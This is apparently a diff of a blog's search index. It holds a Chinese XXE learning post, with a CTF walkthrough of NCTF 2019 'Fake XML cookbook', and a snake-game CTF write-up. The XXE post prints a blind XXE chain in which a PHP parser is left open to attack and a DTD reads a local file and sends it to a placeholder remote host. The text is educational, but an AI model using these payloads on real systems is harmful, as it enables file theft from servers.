+<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
+<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
+<p>2.属性，与html几乎一样</p>
+<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
+<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
+<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
+<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
+<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
+<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
+<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
+<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
+<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
+<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
+<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
+<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
+<p>创建一个t.dtd文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
+<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
+<p>正常显示</p>
+<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
+<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
+<p>2.%实体名;这个只能在dtd中使用</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
+<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
+<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
+<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
+<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
+<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
+<p>　<strong>xml.php</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>　<strong>test.dtd</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>
+
+<p>　<strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p>这里由于没有找到例题，直接抄合天的了</p>
+<p>新学的linux命令</p>
+<p>grep -i “GET” xxx.log</p>
+<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
+]]></content>
+      <categories>
+        <category>技术探索</category>
+      </categories>
+      <tags>
+        <tag>xml</tag>
       </tags>
   </entry>
   <entry>
@@ -990,105 +1056,6 @@
       </tags>
   </entry>
   <entry>
-    <title>记录一题好玩的游戏题</title>
-    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
-    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
-<p>需要我们控制小蛇生存60s，玩玩看</p>
-<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
-<p>玩个蛋，给他60s估计都能飞上月球了</p>
-<p>我们打开控制台看源码</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
-<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
-<p>成功出现flag</p>
-<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
-<p>看看效果</p>
-<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
-<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
-<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
-<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
-
-<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
-<p>嘻嘻</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>javascript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE漏洞学习</title>
-    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
-
-<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
-<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
-<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
-<p>2.属性，与html几乎一样</p>
-<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
-<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
-<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
-<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
-<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
-<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
-<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
-<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
-<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
-<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
-<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
-<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
-<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
-<p>创建一个t.dtd文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
-<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
-<p>正常显示</p>
-<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
-<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
-<p>2.%实体名;这个只能在dtd中使用</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
-<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
-<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
-<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
-<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
-<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
-<p>　<strong>xml.php</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>　<strong>test.dtd</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>
-
-<p>　<strong>payload</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
-<p>这里由于没有找到例题，直接抄合天的了</p>
-<p>新学的linux命令</p>
-<p>grep -i “GET” xxx.log</p>
-<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
-]]></content>
-      <categories>
-        <category>技术探索</category>
-      </categories>
-      <tags>
-        <tag>xml</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>文件包含漏洞</title>
     <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>开</p>
@@ -1148,6 +1115,39 @@
       <tags>
         <tag>ctf</tag>
         <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录一题好玩的游戏题</title>
+    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
+    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
+<p>需要我们控制小蛇生存60s，玩玩看</p>
+<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
+<p>玩个蛋，给他60s估计都能飞上月球了</p>
+<p>我们打开控制台看源码</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
+<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
+<p>成功出现flag</p>
+<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
+<p>看看效果</p>
+<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
+<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
+<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
+<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>
+
+<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
+<p>嘻嘻</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>javascript</tag>
       </tags>
   </entry>
 </search>
